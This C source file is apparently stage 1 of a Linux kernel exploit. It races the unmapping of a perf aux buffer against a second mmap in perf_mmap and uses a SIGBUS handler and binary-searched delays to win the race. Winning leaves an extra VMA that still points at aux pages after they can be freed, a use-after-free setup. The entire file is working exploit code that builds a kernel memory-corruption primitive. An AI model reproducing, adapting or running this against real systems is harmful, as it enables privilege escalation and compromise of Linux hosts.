#include "exploit.h"
#include <stdint.h>
#include <errno.h>
#include <string.h>

/* Stage 1
* This exploit stage performs a race between the unmapping of an aux buffer and the taking of a refcount to the aux buffer in
* perf_mmap.
* If the race is won an additional vma with the correct pgoff will exist without the aux_mmap_count being affected.
* This will allow arbitrarily freeing the aux buffer while still holding a vma that will try to access aux pages
*/

static void sigbus_handler(int signum, siginfo_t* si, void* arg)
{
    if(signum == SIGBUS)
    {
        ucontext_t *ctx = (ucontext_t*)arg;
        global_exp_data->stage1.caught_sigbus = 1;
        //Skip size of the assembly load operation, so that we don't get stuck in an infinite loop of handling sigbus
        ctx->uc_mcontext.gregs[REG_RIP]+=3; 
    }
}

void* stage1_parent(void* args)
{
    int perf_fd = (int)(uint64_t)args;
    struct exp_sync_stage1 *exp_data = &global_exp_data->stage1;
    printf("[P] Started\n");
    while(!exp_data->race_done)
    {
        race_barrier_wait(&exp_data->rdy_barrier);
        void* mmap_aux = mmap(0, TARGET_AUX_SIZE, PROT_READ|PROT_WRITE,MAP_SHARED, perf_fd, TARGET_AUX_OFFSET);
        if(mmap_aux==MAP_FAILED)
        {
            perror("[P] mmap\n");
            printf("[P] mmap err\n");
            exp_data->mapped = 1;
            race_barrier_wait(&exp_data->result_barrier);
            continue;
        }
        exp_data->mapped = 1;
        if(exp_data->usec_delay<0)
            usleep(-exp_data->usec_delay);
        else
            usleep(0);
        munmap(mmap_aux, TARGET_AUX_SIZE);
        race_barrier_wait(&exp_data->result_barrier);
    }
    return NULL;
}

void* stage1_child(void* args)
{
    struct sigaction sa;
    memset(&sa,0, sizeof(sa));
    sigemptyset(&sa.sa_mask);
    sa.sa_sigaction = sigbus_handler;
    sa.sa_flags = SA_SIGINFO;
    sigaction(SIGBUS,&sa, NULL);
    int perf_fd2 = (int)(uint64_t)args;
    struct exp_sync_stage1 *exp_data = &global_exp_data->stage1;
    printf("[C] Started\n");
    while(!exp_data->race_done)
    {
        if(exp_data->usec_delay_max<=exp_data->usec_delay_min+1 && exp_data->race_counter++ == RACE_MAX_FOUND_OFFSET)
        {
            exp_data->race_done = 1;
            return NULL;
        }
        race_barrier_wait(&exp_data->rdy_barrier);
        while(!exp_data->mapped)
            ;//Busy
        exp_data->mapped = 0;
        if(exp_data->usec_delay>0)
            usleep(exp_data->usec_delay);
        else
            usleep(0);

        void* mmap_aux2 = mmap(0, TARGET_AUX_SIZE, PROT_READ,MAP_SHARED, perf_fd2, TARGET_AUX_OFFSET);
        if(mmap_aux2==MAP_FAILED)
        {
            //Too late, adjust delay
            //ENOMEM should only happen in the vm patched kernel instead of ENOTSUP
            if(errno==ENOTSUP || errno==EINVAL || errno==ENOMEM)
            {
                exp_data->usec_delay_max = exp_data->usec_delay;
                exp_data->usec_delay = (exp_data->usec_delay_min+exp_data->usec_delay_max)/2;
            }
            else
            {
                printf("[C] Unexpected behaviour\n");
                exp_data->race_done = 1;
                race_barrier_wait(&exp_data->result_barrier);
                return NULL;    
            }
            race_barrier_wait(&exp_data->result_barrier);
            continue;
        }
        usleep(RACE_ACCESS_PAGE_DELAY);
        char test = *(volatile char*)mmap_aux2;
        if(!exp_data->caught_sigbus)
        {
            //Too early, we incremented refcount before free started
            exp_data->usec_delay_min = exp_data->usec_delay;
            exp_data->usec_delay = (exp_data->usec_delay_min+exp_data->usec_delay_max)/2;
            munmap(mmap_aux2, TARGET_AUX_SIZE);
            //After munmap our rb will be unset because our events mmap count goes to zero
            if(ioctl(global_exp_data->fd2, PERF_EVENT_IOC_SET_OUTPUT, global_exp_data->fd1)<0)
                perror_exit("set_output ioctl");
            race_barrier_wait(&exp_data->result_barrier);
            continue;
        }
        if(exp_data->caught_sigbus)
        {
            printf("[C] Won stage 1 race\n");
            //Won the race
            exp_data->race_done = 1;
            exp_data->success = 1;
            exp_data->extra_vma = mmap_aux2;
            race_barrier_wait(&exp_data->result_barrier);
            return NULL;
        }
        race_barrier_wait(&exp_data->result_barrier);
    }   
}